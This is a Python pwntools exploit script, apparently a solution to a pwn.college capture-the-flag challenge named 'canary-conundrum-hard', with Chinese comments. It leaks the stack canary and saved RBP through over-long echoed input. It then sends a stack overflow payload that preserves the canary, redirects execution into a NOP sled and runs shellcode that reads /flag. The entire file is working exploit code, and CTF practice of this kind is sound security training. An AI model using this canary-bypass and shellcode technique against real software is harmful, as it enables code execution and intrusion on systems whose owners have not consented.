#!/usr/bin/env python3
from pwn import *

context.arch = "amd64"
context.log_level = "info"

# buf -> canary
offset = 104


def exploit():
    p = process("/challenge/canary-conundrum-hard")
    # ==========================================
    # Phase 1: 探测 Canary
    # ==========================================
    p.sendlineafter(b"Payload size: ", str(offset + 1).encode())
    payload1 = b"REPEAT".ljust(offset, b"A") + b"X"
    p.sendafter(b"!\n", payload1)

    p.recvuntil(b"You said: ")
    p.recv(offset + 1)
    leak = p.recv(7)

    canary = u64(b"\x00" + leak)

    # ==========================================
    # Phase 2: 提取 Saved RBP
    # ==========================================
    p.sendlineafter(b"Payload size: ", str(offset + 9).encode())
    payload2 = b"REPEAT".ljust(offset, b"A") + b"Z" + p64(canary)[1:8] + b"Y"
    p.sendafter(b"!\n", payload2)

    p.recvuntil(b"You said: ")
    p.recv(offset + 9)

    raw_leak = p.recvuntil(b"\n", drop=True)

    # 只截取属于指针的 5 个有效字节，防止栈上的垃圾数据导致解包崩溃
    rbp_leak = raw_leak[:5]
    rbp = u64((b"\x00" + rbp_leak).ljust(8, b"\x00"))

    # ==========================================
    # Phase 3: 完美精确的内存分配
    # ==========================================
    shellcode = asm(shellcraft.cat("/flag"))

    # 必须加上 len(shellcode)，否则内核会残酷地将其截断！
    payload3_size = offset + 24 + 1000 + len(shellcode)
    p.sendlineafter(b"Payload size: ", str(payload3_size).encode())

    # 构造 Payload：抵达 Canary -> 填充 Dummy -> 覆写 RIP -> 部署 NOP 滑橇 -> Shellcode
    payload3 = b"A" * offset
    payload3 += p64(canary)
    payload3 += b"B" * 8
    payload3 += p64(rbp)
    payload3 += b"\x90" * 1000
    payload3 += shellcode

    p.sendafter(b"!\n", payload3)

    result = p.recvall(timeout=1)
    if b"pwn.college{" in result or b"flag{" in result:
        print(result.decode().strip())
        return


if __name__ == "__main__":
    exploit()
